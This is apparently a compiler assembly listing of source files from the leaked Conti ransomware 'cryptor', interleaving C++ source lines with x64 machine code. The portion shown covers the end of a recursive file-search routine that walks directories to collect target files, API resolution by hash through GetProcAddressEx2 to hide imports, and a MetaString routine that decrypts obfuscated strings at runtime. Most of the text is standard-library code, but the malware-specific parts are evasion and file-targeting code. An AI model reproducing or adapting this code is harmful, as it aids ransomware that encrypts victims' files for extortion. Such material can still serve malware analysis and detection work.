  00ca5	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  00ca9	48 83 c2 27	 add	 rdx, 39			; 00000027H
  00cad	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00cb0	48 83 c0 f8	 add	 rax, -8
  00cb4	48 83 f8 1f	 cmp	 rax, 31
  00cb8	0f 87 72 01 00
	00		 ja	 $LN1403@SearchFile
$LN1406@SearchFile:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00cbe	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1407@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00cc3	33 f6		 xor	 esi, esi

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00cc5	48 c7 85 88 03
	00 00 07 00 00
	00		 mov	 QWORD PTR Filename$77[rbp-232], 7
  00cd0	48 89 b5 80 03
	00 00		 mov	 QWORD PTR Filename$77[rbp-240], rsi

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00cd7	66 89 b5 70 03
	00 00		 mov	 WORD PTR Filename$77[rbp-256], si
$LN13@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 534  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xff036af1, 62);//GetProcAddress(hKernel32, OBFA("FindNextFileW"));

  00cde	ba 0f 00 00 00	 mov	 edx, 15
  00ce3	41 b8 f1 6a 03
	ff		 mov	 r8d, -16553231		; ff036af1H
  00ce9	44 8d 4a 2f	 lea	 r9d, QWORD PTR [rdx+47]
  00ced	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 535  : 	return pFunction(hFindFile, lpFindFileData);

  00cf2	48 8d 95 c0 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-256]
  00cf9	49 8b cf	 mov	 rcx, r15
  00cfc	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 226  : 		} while (pFindNextFileW(hSearchFile, &FindData));

  00cfe	85 c0		 test	 eax, eax
  00d00	0f 85 6a f8 ff
	ff		 jne	 $LL15@SearchFile

; 227  : 
; 228  : 		TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);

  00d06	49 8b 4e 20	 mov	 rcx, QWORD PTR [r14+32]
  00d0a	49 8b 46 28	 mov	 rax, QWORD PTR [r14+40]
  00d0e	48 85 c9	 test	 rcx, rcx
  00d11	74 06		 je	 SHORT $LN32@SearchFile
  00d13	48 89 41 28	 mov	 QWORD PTR [rcx+40], rax
  00d17	eb 07		 jmp	 SHORT $LN33@SearchFile
$LN32@SearchFile:
  00d19	48 89 85 98 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-248], rax
$LN33@SearchFile:
  00d20	49 8b 4e 28	 mov	 rcx, QWORD PTR [r14+40]
  00d24	49 8b 46 20	 mov	 rax, QWORD PTR [r14+32]
  00d28	48 89 01	 mov	 QWORD PTR [rcx], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00d2b	49 8b 56 18	 mov	 rdx, QWORD PTR [r14+24]
  00d2f	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00d33	76 35		 jbe	 SHORT $LN1248@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00d35	49 8b 0e	 mov	 rcx, QWORD PTR [r14]
  00d38	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00d40	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00d47	72 1c		 jb	 SHORT $LN1247@SearchFile

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00d49	48 8b 79 f8	 mov	 rdi, QWORD PTR [rcx-8]
  00d4d	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00d51	48 2b cf	 sub	 rcx, rdi

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00d54	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00d58	48 83 f8 1f	 cmp	 rax, 31
  00d5c	0f 87 b6 00 00
	00		 ja	 $LN158@SearchFile

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00d62	48 8b cf	 mov	 rcx, rdi
$LN1247@SearchFile:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00d65	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1248@SearchFile:
  00d6a	ba 30 00 00 00	 mov	 edx, 48			; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00d6f	49 89 76 10	 mov	 QWORD PTR [r14+16], rsi
  00d73	49 8b ce	 mov	 rcx, r14

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00d76	49 c7 46 18 07
	00 00 00	 mov	 QWORD PTR [r14+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00d7e	66 41 89 36	 mov	 WORD PTR [r14], si
  00d82	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 543  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x013ee65d, 61);//GetProcAddress(hKernel32, OBFA("FindClose"));

  00d87	ba 0f 00 00 00	 mov	 edx, 15
  00d8c	41 b8 5d e6 3e
	01		 mov	 r8d, 20899421		; 013ee65dH
  00d92	44 8d 4a 2e	 lea	 r9d, QWORD PTR [rdx+46]
  00d96	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 544  : 	return pFunction(hFindFile);

  00d9b	49 8b cf	 mov	 rcx, r15
  00d9e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 232  : 	}

  00da0	e9 1d f7 ff ff	 jmp	 $LN1826@SearchFile
$LN9@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00da5	49 8b 54 24 18	 mov	 rdx, QWORD PTR [r12+24]
  00daa	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00dae	76 32		 jbe	 SHORT $LN1655@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00db0	49 8b 0c 24	 mov	 rcx, QWORD PTR [r12]
  00db4	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00dbc	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00dc3	72 18		 jb	 SHORT $LN1654@SearchFile

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00dc5	48 8b 79 f8	 mov	 rdi, QWORD PTR [rcx-8]
  00dc9	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00dcd	48 2b cf	 sub	 rcx, rdi

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00dd0	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00dd4	48 83 f8 1f	 cmp	 rax, 31
  00dd8	77 44		 ja	 SHORT $LN1651@SearchFile

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00dda	48 8b cf	 mov	 rcx, rdi
$LN1654@SearchFile:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00ddd	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1655@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00de2	49 89 74 24 10	 mov	 QWORD PTR [r12+16], rsi

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00de7	49 c7 44 24 18
	07 00 00 00	 mov	 QWORD PTR [r12+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00df0	66 41 89 34 24	 mov	 WORD PTR [r12], si
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 233  : }

  00df5	48 8b 8d 10 06
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  00dfc	48 33 cc	 xor	 rcx, rsp
  00dff	e8 00 00 00 00	 call	 __security_check_cookie
  00e04	48 81 c4 28 07
	00 00		 add	 rsp, 1832		; 00000728H
  00e0b	41 5f		 pop	 r15
  00e0d	41 5e		 pop	 r14
  00e0f	41 5d		 pop	 r13
  00e11	41 5c		 pop	 r12
  00e13	5f		 pop	 rdi
  00e14	5e		 pop	 rsi
  00e15	5b		 pop	 rbx
  00e16	5d		 pop	 rbp
  00e17	c3		 ret	 0
$LN158@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00e18	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00e1d	cc		 int	 3
$LN1651@SearchFile:
  00e1e	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00e23	cc		 int	 3
$LN1674@SearchFile:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00e24	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00e29	cc		 int	 3
$LN1672@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  00e2a	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00e2f	cc		 int	 3
$LN1403@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00e30	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00e35	cc		 int	 3
$LN1680@SearchFile:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00e36	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00e3b	cc		 int	 3
$LN1678@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  00e3c	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00e41	cc		 int	 3
$LN1818@SearchFile:
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ENDP ; filesystem::SearchFiles
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0directory_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0directory_info_@@QEAA@XZ PROC			; directory_info_::directory_info_, COMDAT

; 2648 :         _My_data._Mysize = 0;

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2648 :         _My_data._Mysize = 0;

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  0000c	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00014	66 89 01	 mov	 WORD PTR [rcx], ax
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0directory_info_@@QEAA@XZ ENDP			; directory_info_::directory_info_
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??_Gdirectory_info_@@QEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$dead$ = 56
??_Gdirectory_info_@@QEAAPEAXI@Z PROC			; directory_info_::`scalar deleting destructor', COMDAT
$LN43:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00006	48 8b 51 18	 mov	 rdx, QWORD PTR [rcx+24]
  0000a	48 8b d9	 mov	 rbx, rcx
  0000d	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00011	76 31		 jbe	 SHORT $LN30@scalar
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00013	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00016	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001e	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00025	72 18		 jb	 SHORT $LN29@scalar

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00027	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0002b	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0002f	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00032	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00036	48 83 f8 1f	 cmp	 rax, 31
  0003a	77 2d		 ja	 SHORT $LN26@scalar

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0003c	49 8b c8	 mov	 rcx, r8
$LN29@scalar:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0003f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN30@scalar:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00044	33 c0		 xor	 eax, eax

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7
  0004e	48 8b cb	 mov	 rcx, rbx

; 4873 :         _My_data._Mysize = 0;

  00051	48 89 43 10	 mov	 QWORD PTR [rbx+16], rax

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00055	66 89 03	 mov	 WORD PTR [rbx], ax
  00058	8d 50 30	 lea	 edx, QWORD PTR [rax+48]
  0005b	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
  00060	48 8b c3	 mov	 rax, rbx
  00063	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00067	5b		 pop	 rbx
  00068	c3		 ret	 0
$LN26@scalar:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00069	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0006e	cc		 int	 3
$LN40@scalar:
??_Gdirectory_info_@@QEAAPEAXI@Z ENDP			; directory_info_::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??1directory_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1directory_info_@@QEAA@XZ PROC			; directory_info_::~directory_info_, COMDAT
$LN39:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00006	48 8b 51 18	 mov	 rdx, QWORD PTR [rcx+24]
  0000a	48 8b d9	 mov	 rbx, rcx
  0000d	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00011	76 31		 jbe	 SHORT $LN27@directory_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00013	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00016	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001e	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00025	72 18		 jb	 SHORT $LN26@directory_

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00027	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0002b	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0002f	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00032	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00036	48 83 f8 1f	 cmp	 rax, 31
  0003a	77 1f		 ja	 SHORT $LN23@directory_

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0003c	49 8b c8	 mov	 rcx, r8
$LN26@directory_:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0003f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN27@directory_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00044	33 c0		 xor	 eax, eax

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7
  0004e	48 89 43 10	 mov	 QWORD PTR [rbx+16], rax

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00052	66 89 03	 mov	 WORD PTR [rbx], ax
  00055	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00059	5b		 pop	 rbx
  0005a	c3		 ret	 0
$LN23@directory_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0005b	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00060	cc		 int	 3
$LN36@directory_:
??1directory_info_@@QEAA@XZ ENDP			; directory_info_::~directory_info_
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 06 00 00
	00		 mov	 r10d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2e	 mov	 BYTE PTR [rcx+1], 46	; 0000002eH
  00007	c6 41 02 64	 mov	 BYTE PTR [rcx+2], 100	; 00000064H
